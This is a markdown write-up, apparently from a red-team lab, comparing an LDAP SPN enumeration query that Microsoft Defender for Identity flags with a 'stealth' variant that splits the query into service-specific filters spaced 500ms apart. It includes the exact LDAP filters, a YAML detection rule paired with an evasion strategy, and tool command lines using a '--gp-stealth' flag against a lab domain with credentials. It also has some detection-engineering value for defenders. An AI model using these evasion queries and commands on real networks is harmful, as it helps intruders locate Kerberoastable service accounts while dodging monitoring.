# LDAP Query Analysis: Detection vs. Stealth

## 🔴 **DETECTION-TRIGGERING QUERY** (What MDI Caught)

### Original Query Pattern
```ldap
Base DN: DC=ludus,DC=domain
Filter: (&(objectClass=user)(objectCategory=CN=Person,CN=Schema,CN=Configuration,DC=ludus,DC=domain)(servicePrincipalName=*))
Scope: WholeSubtree
Attributes: distinguishedName, sAMAccountName, servicePrincipalName, userPrincipalName, displayName, lastLogon, pwdLastSet
```

### MDI Detection Signature
```
⚠️  ALERT TRIGGERED: "Possible SPN enumeration via LDAP"
⚠️  Pattern: Bulk servicePrincipalName=* query
⚠️  Classification: AllUsers enumeration
⚠️  Risk Level: Medium
```

---

## 🟢 **STEALTH QUERY PATTERN** (Evasion Technique)

### Service-Specific Query Breakdown
Instead of one broad query, we send multiple targeted queries:

```ldap
# Query 1: HTTP Services
Base DN: DC=ludus,DC=domain
Filter: (&(objectClass=user)(servicePrincipalName=HTTP/*))
Scope: WholeSubtree
Attributes: distinguishedName, sAMAccountName, servicePrincipalName, userPrincipalName, displayName, lastLogon, pwdLastSet

[500ms delay]

# Query 2: SQL Services  
Base DN: DC=ludus,DC=domain
Filter: (&(objectClass=user)(servicePrincipalName=MSSQLSvc/*))
Scope: WholeSubtree
Attributes: [same attributes]

[500ms delay]

# Query 3: File Services
Base DN: DC=ludus,DC=domain
Filter: (&(objectClass=user)(servicePrincipalName=CIFS/*))
Scope: WholeSubtree
Attributes: [same attributes]

[500ms delay]

# Query 4-8: Continue for TERMSRV/*, WSMAN/*, ldap/*, HOST/*, RestrictedKrbHost/*
```

### Why This Evades Detection
```
✅ No broad wildcard: servicePrincipalName=HTTP/* vs servicePrincipalName=*
✅ Legitimate appearance: Looks like admin investigating specific services
✅ Query spacing: 500ms delays avoid bulk enumeration pattern  
✅ Service context: Each query has valid business justification
✅ Reduced signature: No single large enumeration footprint
```

---

## 📊 **Query Comparison Matrix**

| Aspect | **Detection Method** | **Stealth Method** |
|--------|---------------------|-------------------|
| **Filter Scope** | `servicePrincipalName=*` | `servicePrincipalName=HTTP/*` |
| **Query Count** | 1 large query | 8 small queries |
| **Timing** | Single burst | Spaced over 4+ seconds |
| **Pattern** | Bulk enumeration | Service-specific investigation |
| **MDI Classification** | AllUsers enumeration | Individual service queries |
| **Business Justification** | Reconnaissance | Legitimate admin task |
| **Alert Risk** | ✅ **HIGH** | ❌ **LOW** |

---

## 🔍 **Detection Engineering Insights**

### What MDI Looks For:
```yaml
SPN_Enumeration_Rule:
  trigger_conditions:
    - filter_contains: "servicePrincipalName=*"
    - object_class: "user"
    - scope: "WholeSubtree" 
    - attributes_include: "servicePrincipalName"
    - source_external: true
  classification: "AllUsers"
  severity: "Medium"
  mitre_attack: "T1087.002"
```

### Our Evasion Strategy:
```yaml
Stealth_Approach:
  avoid_patterns:
    - "No broad wildcards in SPN filters"
    - "No single large enumeration requests" 
    - "No burst query patterns"
  mimic_legitimate:
    - "Service-specific administrative queries"
    - "Reasonable timing between requests"
    - "Mixed enumeration contexts"
```

---

## 🛠 **Practical Implementation**

### Command Comparison:

**🔴 Triggers Detection:**
```bash
./spectral-gopacket -t 10.10.10.10 -d ludus.domain -u domainuser -p password -gp
```

**🟢 Evades Detection:**
```bash
./spectral-gopacket -t 10.10.10.10 -d ludus.domain -u domainuser -p password -gp --gp-stealth
```

### Network Traffic Difference:

**Detection Method:**
```
[Timestamp] LDAP Search: servicePrincipalName=* (1 request, ~200ms)
```

**Stealth Method:**
```
[Timestamp+0ms]    LDAP Search: servicePrincipalName=HTTP/*
[Timestamp+500ms]  LDAP Search: servicePrincipalName=MSSQLSvc/*  
[Timestamp+1000ms] LDAP Search: servicePrincipalName=CIFS/*
[Timestamp+1500ms] LDAP Search: servicePrincipalName=TERMSRV/*
[Timestamp+2000ms] LDAP Search: servicePrincipalName=WSMAN/*
[Timestamp+2500ms] LDAP Search: servicePrincipalName=ldap/*
[Timestamp+3000ms] LDAP Search: servicePrincipalName=HOST/*
[Timestamp+3500ms] LDAP Search: servicePrincipalName=RestrictedKrbHost/*
```

---

## 🎯 **Testing Validation**

When labs are available, this framework tests:

1. **Baseline Detection**: Confirm direct method triggers alerts
2. **Stealth Validation**: Verify service-specific queries avoid detection  
3. **Timing Analysis**: Ensure delays prevent burst pattern recognition
4. **Result Accuracy**: Confirm stealth method finds same Kerberoastable accounts
5. **Operational Security**: Validate real-world evasion effectiveness

This systematic approach provides both **operational stealth** for red teams and **detection insights** for blue teams.